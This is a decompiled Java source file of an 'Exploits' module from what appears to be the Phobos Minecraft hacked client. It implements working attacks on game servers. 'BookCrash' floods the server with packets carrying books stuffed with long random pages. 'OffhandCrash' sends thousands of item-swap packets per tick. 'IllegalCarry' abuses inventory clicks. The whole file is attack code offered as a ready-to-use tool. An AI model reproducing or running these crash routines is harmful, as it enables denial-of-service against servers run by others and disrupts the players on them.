
/*
 * Decompiled with CFR 0.151.
 * 
 * Could not load the following classes:
 *  net.minecraft.client.gui.GuiDisconnected
 *  net.minecraft.client.gui.GuiDownloadTerrain
 *  net.minecraft.client.gui.GuiMainMenu
 *  net.minecraft.client.gui.GuiMultiplayer
 *  net.minecraft.client.gui.inventory.GuiContainer
 *  net.minecraft.client.multiplayer.GuiConnecting
 *  net.minecraft.entity.player.EntityPlayer
 *  net.minecraft.init.Items
 *  net.minecraft.init.SoundEvents
 *  net.minecraft.inventory.ClickType
 *  net.minecraft.inventory.Slot
 *  net.minecraft.item.ItemStack
 *  net.minecraft.nbt.NBTBase
 *  net.minecraft.nbt.NBTTagCompound
 *  net.minecraft.nbt.NBTTagList
 *  net.minecraft.nbt.NBTTagString
 *  net.minecraft.network.Packet
 *  net.minecraft.network.play.INetHandlerPlayServer
 *  net.minecraft.network.play.client.CPacketClickWindow
 *  net.minecraft.network.play.client.CPacketCreativeInventoryAction
 *  net.minecraft.network.play.client.CPacketPlayerDigging
 *  net.minecraft.network.play.client.CPacketPlayerDigging$Action
 *  net.minecraft.network.play.server.SPacketSoundEffect
 *  net.minecraft.util.EnumFacing
 *  net.minecraft.util.math.BlockPos
 *  net.minecraftforge.fml.common.eventhandler.EventPriority
 *  net.minecraftforge.fml.common.eventhandler.SubscribeEvent
 *  net.minecraftforge.fml.common.gameevent.InputEvent$KeyInputEvent
 *  org.lwjgl.input.Keyboard
 */
package me.earth.phobos.features.modules.misc;

import java.util.Random;
import me.earth.phobos.event.events.PacketEvent;
import me.earth.phobos.features.modules.Module;
import me.earth.phobos.features.setting.Bind;
import me.earth.phobos.features.setting.Setting;
import net.minecraft.client.gui.GuiDisconnected;
import net.minecraft.client.gui.GuiDownloadTerrain;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraft.client.gui.GuiMultiplayer;
import net.minecraft.client.gui.inventory.GuiContainer;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.init.Items;
import net.minecraft.init.SoundEvents;
import net.minecraft.inventory.ClickType;
import net.minecraft.inventory.Slot;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.play.INetHandlerPlayServer;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.network.play.server.SPacketSoundEffect;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.fml.common.eventhandler.EventPriority;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.InputEvent;
import org.lwjgl.input.Keyboard;

public class Exploits
extends Module {
    public Setting<Boolean> illegalCarry = this.register(new Setting<Boolean>("IllegalCarry", false));
    public Setting<Bind> toXCarry = this.register(new Setting<Object>("ToXCarry", new Bind(-1), v -> this.illegalCarry.getValue()));
    public Setting<Bind> fromXCarry = this.register(new Setting<Object>("FromXCarry", new Bind(-1), v -> this.illegalCarry.getValue()));
    public Setting<Boolean> bookCrash = this.register(new Setting<Boolean>("BookCrash", false));
    public Setting<Mode> mode = this.register(new Setting<Object>("Mode", (Object)Mode.WindowClick, v -> this.bookCrash.getValue()));
    public Setting<Integer> delay = this.register(new Setting<Object>("Delay", Integer.valueOf(5), Integer.valueOf(1), Integer.valueOf(500), v -> this.bookCrash.getValue()));
    public Setting<Integer> strLength = this.register(new Setting<Object>("Length", Integer.valueOf(600), Integer.valueOf(100), Integer.valueOf(655), v -> this.bookCrash.getValue()));
    public Setting<Boolean> offhandCrash = this.register(new Setting<Boolean>("OffhandCrash", false));
    private final Setting<Boolean> antilag = this.register(new Setting<Object>("AntiOffhandCrash", Boolean.valueOf(true), v -> this.offhandCrash.getValue()));
    private final Setting<Boolean> docrash = this.register(new Setting<Object>("Use Offhand Crash", Boolean.valueOf(true), v -> this.offhandCrash.getValue()));
    private final Setting<Integer> loopzz = this.register(new Setting<Object>("Times to loop", Integer.valueOf(500), Integer.valueOf(100), Integer.valueOf(5000), v -> this.offhandCrash.getValue()));
    private Packet<INetHandlerPlayServer> packet;
    private String pages = "";
    private boolean flag = true;

    public Exploits() {
        super("Exploits", "Some exploits.", Module.Category.MISC, true, false, false);
    }

    @Override
    public void onEnable() {
        if (this.bookCrash.getValue().booleanValue()) {
            this.pages = this.genRandomString(this.strLength.getValue());
            this.runThread();
            this.flag = true;
        }
    }

    @Override
    public void onDisable() {
        if (this.bookCrash.getValue().booleanValue()) {
            this.pages = "";
            this.flag = false;
        }
    }

    @Override
    public void onUpdate() {
        if (this.offhandCrash.getValue().booleanValue()) {
            if (this.docrash.getValue().booleanValue()) {
                for (int i = 0; i < this.loopzz.getValue(); ++i) {
                    BlockPos playerBlock = new BlockPos(Exploits.mc.player.posX, Exploits.mc.player.posY - 1.0, Exploits.mc.player.posZ);
                    Exploits.mc.player.connection.sendPacket((Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, playerBlock, EnumFacing.UP));
                }
            }
            if ((Exploits.mc.currentScreen instanceof GuiMainMenu || Exploits.mc.currentScreen instanceof GuiDisconnected || Exploits.mc.currentScreen instanceof GuiDownloadTerrain || Exploits.mc.currentScreen instanceof GuiConnecting || Exploits.mc.currentScreen instanceof GuiMultiplayer) && this.isEnabled()) {
                this.toggle();
            }
        }
    }

    @SubscribeEvent
    public void onPacketSend(PacketEvent.Send event) {
        if (this.offhandCrash.getValue().booleanValue() && this.antilag.getValue().booleanValue() && event.getPacket() instanceof SPacketSoundEffect && ((SPacketSoundEffect)event.getPacket()).getSound() == SoundEvents.ITEM_ARMOR_EQUIP_GENERIC) {
            event.setCanceled(true);
        }
    }

    @Override
    public void onLogout() {
        this.disable();
    }

    private void runThread() {
        new Thread(() -> {
            try {
                ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                NBTTagList list = new NBTTagList();
                NBTTagCompound tag = new NBTTagCompound();
                String author = mc.getSession().getUsername();
                for (int i = 0; i < 50; ++i) {
                    NBTTagString tString = new NBTTagString(this.pages);
                    list.appendTag((NBTBase)tString);
                }
                tag.setString("author", author);
                tag.setString("title", "\n ZimCRASH \n");
                tag.setTag("pages", (NBTBase)list);
                bookObj.setTagInfo("pages", (NBTBase)list);
                bookObj.setTagCompound(tag);
                if (this.mode.getValue() == Mode.ConsoleSpammer) {
                    this.pages = this.genRandomString(8192);
                    this.strLength.setValue(8192);
                    this.delay.setValue(225);
                }
                while (this.flag) {
                    switch (this.mode.getValue()) {
                        case CreativeInventory: {
                            this.packet = new CPacketCreativeInventoryAction(0, bookObj);
                        }
                        case WindowClick: {
                            this.packet = new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short) 0);
                        }
                        case ConsoleSpammer: {
                            this.packet = new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short) 0);
                        }
                    }
                    Exploits.mc.player.connection.sendPacket(this.packet);
                    try {
                        Thread.sleep(this.delay.getValue().intValue());
                    }
                    catch (Exception e) {
                        Thread.interrupted();
                    }
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private String genRandomString(Integer Length) {
        String SALTCHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        StringBuilder salt = new StringBuilder();
        Random rnd = new Random();
        while (salt.length() < Length) {
            int index = (int)(rnd.nextFloat() * (float)SALTCHARS.length());
            salt.append(SALTCHARS.charAt(index));
        }
        return salt.toString();
    }

    @SubscribeEvent(priority=EventPriority.NORMAL, receiveCanceled=true)
    public void onKeyInput(InputEvent.KeyInputEvent event) {
        if (this.illegalCarry.getValue().booleanValue() && Keyboard.getEventKeyState() && Exploits.mc.currentScreen instanceof GuiContainer) {
            GuiContainer container;
            Slot slot;
            if (this.toXCarry.getValue().getKey() == Keyboard.getEventKey()) {
                GuiContainer container2 = (GuiContainer)Exploits.mc.currentScreen;
                Slot slot2 = container2.getSlotUnderMouse();
                if (slot2 != null) {
                    Exploits.mc.playerController.windowClick(container2.inventorySlots.windowId, slot2.getSlotIndex(), 0, ClickType.PICKUP, (EntityPlayer)Exploits.mc.player);
                    Exploits.mc.playerController.windowClick(container2.inventorySlots.windowId, -999, 0, ClickType.QUICK_CRAFT, (EntityPlayer)Exploits.mc.player);
                    Exploits.mc.playerController.windowClick(0, 1, 1, ClickType.QUICK_CRAFT, (EntityPlayer)Exploits.mc.player);
                    Exploits.mc.playerController.windowClick(container2.inventorySlots.windowId, -999, 2, ClickType.QUICK_CRAFT, (EntityPlayer)Exploits.mc.player);
                }
            } else if (this.fromXCarry.getValue().getKey() == Keyboard.getEventKey() && (slot = (container = (GuiContainer)Exploits.mc.currentScreen).getSlotUnderMouse()) != null) {
                Exploits.mc.playerController.windowClick(0, 1, 0, ClickType.PICKUP, (EntityPlayer)Exploits.mc.player);
                Exploits.mc.playerController.windowClick(0, -999, 0, ClickType.QUICK_CRAFT, (EntityPlayer)Exploits.mc.player);
                Exploits.mc.playerController.windowClick(container.inventorySlots.windowId, slot.getSlotIndex(), 1, ClickType.QUICK_CRAFT, (EntityPlayer)Exploits.mc.player);
                Exploits.mc.playerController.windowClick(0, -999, 2, ClickType.QUICK_CRAFT, (EntityPlayer)Exploits.mc.player);
            }
        }
    }

    private static enum Mode {
        CreativeInventory,
        WindowClick,
        ConsoleSpammer;

    }
}

